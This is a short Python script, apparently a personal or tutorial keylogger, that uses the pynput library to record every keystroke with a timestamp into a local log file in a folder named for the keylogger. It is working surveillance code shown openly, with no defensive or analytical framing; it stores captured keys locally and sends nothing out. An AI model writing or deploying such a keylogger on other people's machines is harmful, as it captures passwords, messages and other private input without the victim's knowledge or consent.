import pynput
from pynput.keyboard import Key, Listener
import logging  #used to log all the details into a text file

log_dir= r"D:/Keylogger/Intermediate Keylogger"
logging.basicConfig (filename=(log_dir + r"/log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info (str(key))


with Listener (on_press= on_press) as listener:
    listener.join()



